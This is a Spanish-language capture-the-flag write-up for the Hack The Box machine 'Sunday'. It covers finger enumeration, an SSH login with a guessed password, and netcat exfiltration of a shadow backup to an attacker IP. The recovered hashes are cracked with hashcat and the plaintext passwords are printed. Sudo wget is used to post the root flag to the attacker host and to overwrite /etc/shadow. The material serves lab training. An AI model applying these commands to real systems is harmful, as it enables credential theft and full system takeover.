# Sunday

## NMAP

Nos encontramos con varios puertos abiertos el que nos llama la atencion es el 79. Estuve enumerando otros protocolos pero no encontre nada


![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/5c96a38b-990e-4d74-9e4c-c59001160e63)

> El protocolo Finger es un protocolo de red que se utilizaba originalmente para obtener información sobre los usuarios de un sistema remoto. 

Lo que he visto es que simpre hay te intentar evitar la enumeracion de SSh que sea la ultima opcion es muy lenta.

## RCE

Tenemos tres usuarios que encontramos con el finger root, sammy y sunny. Es importante que este check se haga para todas las maquinas sobre todo para las viejas 

***1. Checar si el password de un servicio ssh no es el nombre de la maquina***
***2. Checar si el nombre de la maquina no sea un subdominio***

En este caso el password si fue el nombre de la maquina.

```
ssh sunny@10.129.64.41 -p 22022

passwd:sunday
```

## Priv Escalation

En el bash history encontramos un shadow.backup

![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/9b445f9b-1a74-4507-bc34-3e6402cc1bfe)


Entonces si tenemos el shadow y podemos leer el /etc/passwd se puede crackear el password de otros usuarios...

![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/764daca6-63ae-4f1e-ae24-8b2d2c4b4cbc)


Nos compartimos el shadow

```
nc 10.10.14.57 1234 < /backup/shadow.backup

nc -lvnp 1234 > password.txt    

unshadow password.txt shadow.txt > un.txt


```

### Hashcat

Para saber el modo fijate en los $ 

![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/384ac6ca-fbe2-4855-ba73-1935c8d0f8c4)

![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/a49afbe4-a1f3-4f3b-884c-2a4e2ef61a52)


```
hashcat -m 7400 -a 0 un.txt /usr/share/wordlists/rockyou.txt
```


![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/972c6474-d9c6-47d2-8354-8b428a7b4ae0)


```
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:sunday

```

Nos conectamos por ssh pero ahora con el usuario sammy.


![image](https://github.com/gecr07/Sunday-HTB/assets/63270579/da30fc58-3814-490d-81be-4703ada4da49)


Ya con esto tenemos una via potencial para ser root o leer la flag.

```
sudo wget --input-file /root/root.txt
```

Tambien podemos mandar el archivo dentro de una peticion post.

```
sudo wget --post-file /root/root.txt http://10.10.14.57:443/

## attacker

nc -lvnp 443 

```

Otra manera es sobre escribir el archivo shadow para que root tenga el mismo passwd que sunny

```
root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

## Metemos lo mismo que sunny solo cambiamos el usuario a root y la contraseña sera la misma.

 sudo wget -O /etc/shadow http://10.10.14.57:8081/shadow 
```

Y la que yo use es ver en GTOBINs y ahi nos regresa una shell root.

## Bibliografia 

> https://www.zonasystem.com/2020/06/password-cracking-en-linux-john-the-ripper-hashcat.html




























